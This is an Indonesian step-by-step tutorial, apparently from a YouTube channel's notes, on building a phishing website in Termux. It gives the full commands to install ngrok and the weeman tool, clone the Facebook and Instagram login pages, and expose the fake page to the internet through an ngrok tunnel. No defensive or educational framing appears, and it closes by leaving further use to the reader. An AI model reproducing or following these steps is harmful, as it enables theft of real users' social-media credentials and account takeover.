@@ -1,0 +1,62 @@
+Cara membuat web Phising di termux
+
+
+1. Daftar, Download dan Install Ngrok
+    
+    https://dashboard.ngrok.com/signup
+    
+    ikuti panduan installasi Ngrok di termux, 
+    ikuti stepnya, semua sudah disediakan cara installasinya di website nya.
+
+2. Install script weeman di aplikasi termux
+
+    Buka aplikasi termux kemudian tuliskan semua perintah dibawah ini:
+
+    $ apt update && apt upgrade
+    $ pkg install git
+    $ pkg install python2
+    $ pip2 install bs4
+    $ pip2 install beautifulsoup
+    $ git clone https://github.com/evait-security/weeman
+
+3. Tentukan halaman situs untuk diclone
+
+    Pertama jalankan dulu script weemannya. 
+    Cara nya ketik perintah berikut ini:
+
+    $ cd weeman
+    $ python2 weeman.py
+
+    Kemudian kalian tentukan situs apa yang ingin diduplikat.
+    Sebagai contoh disini saya mengambil halaman facebook.
+
+    Jadi perintah yang dimasukan adalah:
+
+    $ set action_url https://facebook.com/login.php
+    $ set port 8080
+    $ run
+
+    Misal ingin clone halaman instagram, maka:
+
+    $ set action_url https://www.instagram.com
+    $ set port 8080
+    $ run
+
+4. Aktifkan forwarding ngrok (opsional)
+
+    $ cd ngrok
+    $ ./ngrok http 8080
+
+   Akan da 2 link muncul di ngrok, copy saja salah satunya. saya biasa pakai yg https
+   
+   *CATATAN : Jika ngrok reconnect / tidak bisa connect, coba aktifkan hotspot.
+                         Jika masih kesulitan, silahkan tonton kembali videonya dan cermati.
+
+    Sekian.
+
+    Selanjutnya Terserah Kamu.
+    
+    ☺ Sebelumnya 🔥Thanks Buat Kamu Yang
+          Udah Subscribe Chanel Kecilku.
+          
+          🙏Mathurnuwun, #BONCOKBIRONG
